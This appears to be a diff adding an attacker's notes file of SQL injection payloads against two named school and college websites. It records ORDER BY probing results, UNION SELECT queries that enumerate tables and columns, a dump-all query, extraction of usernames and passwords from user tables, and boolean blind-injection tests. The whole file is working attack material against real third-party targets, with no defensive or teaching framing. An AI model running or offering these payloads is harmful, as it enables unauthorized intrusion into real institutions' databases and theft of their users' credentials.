@@ -1,0 +1,62 @@
+http://www.simscollege.ac.in/news.php?id=52' order 1--+- OK
+http://www.simscollege.ac.in/news.php?id=52' order 1000--+- NOT OK
+
+STRING BASED
+
+http://www.simscollege.ac.in/news.php?id=52 order by 1--+- OK
+http://www.simscollege.ac.in/news.php?id=52 order by 10000--+- OK
+
+INTEGER BASED
+
+http://www.simscollege.ac.in/news.php?id=52' order by 11--+-
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select table_name from information_schema.tables where table_schema=database() limit 1,1)--+-
+
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select column_name from information_schema.columns where table_name='tbl_user_access' limit 0,1)--+-
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select username from tbl_user_access limit 0,1)--+-
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select pwd from tbl_user_access limit 0,1)--+-
+
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select table_name from information_schema.tables where table_schema=database() limit 1,1)--+-
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)--+-
+
+https://mtspublicschool.ac.in/news.php?id=37 order by 1--+- OK
+https://mtspublicschool.ac.in/news.php?id=37 order by 100000--+- NOT OK
+
+https://mtspublicschool.ac.in/news.php?id=37' order by 1--+- NOT OK
+https://mtspublicschool.ac.in/news.php?id=37' order by 100000--+- NOT OK
+
+https://mtspublicschool.ac.in/news.php?id=37 order by 3--+-
+
+
+https://mtspublicschool.ac.in/news.php?id=37 union select 1,2,3--+-
+https://mtspublicschool.ac.in/news.php?id=37 order by 3--+-
+
+
+https://mtspublicschool.ac.in/news.php?id=37 union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a),3--+-
+
+
+https://mtspublicschool.ac.in/news.php?id=37 union select 1,(select concat_ws(username,0x3a,password) from login_tb),3--+-
+
+
+
+
+---
+
+http://www.simscollege.ac.in/news.php?id=52%27 and 1=1--+- TRUE
+http://www.simscollege.ac.in/news.php?id=52%27 and 1=2--+- FALSE
+
+
+http://www.simscollege.ac.in/news.php?id=52%27 and ascii(substr(version(),1,1))>1--+-
+http://www.simscollege.ac.in/news.php?id=52%27%20and%20ascii(substr(version(),1,1))%3E1999--+-
+
+
+
+
+
+
+
